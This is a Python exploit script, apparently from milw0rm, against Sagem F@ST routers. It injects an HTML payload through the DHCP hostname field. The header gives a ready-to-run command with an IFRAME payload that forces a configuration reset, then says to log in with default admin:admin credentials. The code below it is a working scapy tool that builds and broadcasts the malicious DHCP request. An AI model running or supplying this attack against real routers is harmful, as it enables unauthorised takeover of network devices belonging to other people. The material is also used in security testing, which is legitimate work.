#!/usr/bin/env python
# 
#
#
# OOO OOO             OO                            OOO                                
#  O   O               O                           O   O
#  O   O               O                           O   O
#  O   O  OO OO    OOOOO   OOOOO  OOO OO  OOOOOO   O   O  OO OO    OOOOO
#  O   O   OO  O  O    O  O     O   OO  O O   O    O   O   OO  O  O     O
#  O   O   O   O  O    O  OOOOOOO   O        O     O   O   O   O  OOOOOOO
#  O   O   O   O  O    O  O         O       O      O   O   O   O  O
#  O   O   O   O  O    O  O     O   O      O   O   O   O   O   O  O     O
#   OOO   OOO OOO  OOOOOO  OOOOO  OOOOO   OOOOOO    OOO   OOO OOO  OOOOO                                                                                        
#
# 
# Sagem Routers F@ST (1200/1240/1400/1400W/1500/1500-WG/2404) Remote CSRF Exploit (dhcp hostname attack)
#
# Discovery Date     : 13/09/2009
# Author             : Underz0ne Crew
#                      Zigma
# Author Of The Tool : Rafael Dominguez Vega
#
# First Of all Read this paper : http://www.mwrinfosecurity.com/publications/mwri_behind-enemy-lines_2008-07-25.pdf
#
# Description : Using DHCP as a method of attack, arbitrary and malicious scripting can be injected into the DHCP administrative and logs pages (if enabled). When the web administration toold is accessed, the code injection will execute with administrative privileges, which could lead to a complete compromise of the system.
# 
#  How To Exploit : 
# 
# Zigma@Underz0ne # python dhcpattack.py -i eth0 -t 192.168.1.1 -p "<IFRAME height=0 width=0 src='http://192.168.1.1/restoreinfo.cgi'></IFRAME>" 
#
# 0y]Z
# 
# Starting....
# .
# Sent 1 packets.
#
# Now When the Admin Enters to "Advanced Status" "DHCP" the CSRF Get's executed and the account get reseted , now u can simply access the web-based Administration Panel with : admin:admin  
# So Many Routers Suffers from dhcp hostname attack... 
# 
# 
#
#
#                         --/*/-----------------------------------------/*--
#
# This tool is distributed under a BSD licence. A copy of this 
# should have been included with this file.
#Copyright (c) 2008, Rafael Dominguez Vega
#
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:
#
#    * Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
#    * Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
#    * Neither the name of MWR InfoSecurity nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.
#
#THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
#"AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
#LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
#A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR
#CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
#EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
#PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR
#PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF
#LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING
#NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
#SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
# 
#
#Copyright (c) 2008, Rafael Dominguez Vega.
#
# This tool is designed for the purpose of performing security 
# testing only and is not intended to be used for unlawful 
# activities.
#
# This tool can be used to check for DHCP script injection vulnerabilities 
# in different sofware products.
#
# Required Libraries:
#scapy.py - "Packet generator/sniffer and network scanner/discovery"
#http://www.secdev.org/projects/scapy/
#
# Help can be viewed by running this file with --help. 
# 
#
# Author: Rafael Dominguez Vega
# Version: 0.0.2
#
# Further information: rafael ({dot}) dominguez-vega <(at)> mwrinfosecurity {(dot)} com
#

import optparse
from scapy import *
import socket
import fcntl
import struct
import os
import sys
import string
from optparse import OptionParser

class OptionParser (optparse.OptionParser):

    def check_required (self, opt):
        option = self.get_option(opt)

        if getattr(self.values, option.dest) is None:
            self.error("%s option not supplied" % option)

parser = OptionParser()
parser.add_option("-i", "--interface", action="store", dest="hwr",help="Network Interface (required)")
parser.add_option("-t", "--target", action="store", dest="server", help="DHCP Server IP address (required)")
parser.add_option("-p", "--hostname", action="store", dest="payload",  help="DHCP Hostname. Between double quotes (\"\") if special characters are used (required)")

(options, args) = parser.parse_args()

parser.check_required("-i")
if options.hwr:
    hwr = options.hwr
else:
    sys.exit(0)
    
parser.check_required("-t")
if options.server:
    server = options.server
else:
    sys.exit(0)
    
parser.check_required("-p")
if options.payload:
    payload = options.payload
else:
    sys.exit(0)
    

#Acknowledgement to Paul Cannon & Frank Millman for the following code chunk

def get_ip_address(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(
        s.fileno(),
        0x8915,  
        struct.pack('256s', ifname[:15])
    )[20:24])

def getMacAddress():
    if sys.platform == 'win32':
        for line in os.popen("ipconfig /all"):
            if line.lstrip().startswith('Physical Address'):
                mac = line.split(':')[1].strip().replace('-',':')
                break
    else:
        for line in os.popen("/sbin/ifconfig"):
            if line.find('Ether') > -1:
                mac = line.split()[4]
                break
    return mac

# end of code chunk

srcmac = getMacAddress()
ip = get_ip_address(hwr)


macad = srcmac.split(":")

n0 = int(macad[0], 16)
n1 = int(macad[1], 16)
n2 = int(macad[2], 16)
n3 = int(macad[3], 16)
n4 = int(macad[4], 16)
n5 = int(macad[5], 16)

m0 = chr(n0)
m1 = chr(n1)
m2 = chr(n2)
m3 = chr(n3)
m4 = chr(n4)
m5 = chr(n5)

print(m0)
chmac = (m0+m1+m2+m3+m4+m5)

q = ip.split(".")

t0 = int(q[0])
t1 = int(q[1])
t2 = int(q[2])
t3 = int(q[3])

r0 = chr(t0)
r1 = chr(t1)
r2 = chr(t2)
r3 = chr(t3)

hexip = (r0+r1+r2+r3)

print (chmac)
print (hexip)

print("Starting....")

ether = Ether(src= srcmac,dst="ff:ff:ff:ff:ff:ff")
ip = IP(src="0.0.0.0",dst="255.255.255.255")
udp = UDP(sport=68,dport=67)
bootp = BOOTP(op="BOOTREQUEST", chaddr= chmac)
dhcp = DHCP(options=[('message-type',3),('hostname', payload),(50, hexip),("server_id", server),('param_req_list','pad'),('end'),('pad')])

discover_packet = ether/ip/udp/bootp/dhcp
sendp(discover_packet)

# milw0rm.com [2008-09-22]